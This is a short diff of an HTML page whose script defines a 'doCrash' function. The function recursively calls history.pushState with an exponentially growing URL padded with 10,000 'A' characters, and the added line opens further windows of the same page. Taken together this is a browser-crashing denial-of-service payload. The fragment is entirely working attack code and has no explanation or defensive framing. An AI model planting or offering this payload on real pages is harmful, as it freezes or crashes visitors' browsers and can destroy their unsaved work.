@@ -2,6 +2,7 @@
 <body>
 <script>
 function doCrash() {
+    window.open(location.href);
     setInterval(history.pushState(0,0,location.href+location.href+"A".repeat(10000)),7000);    
     doCrash();
 };
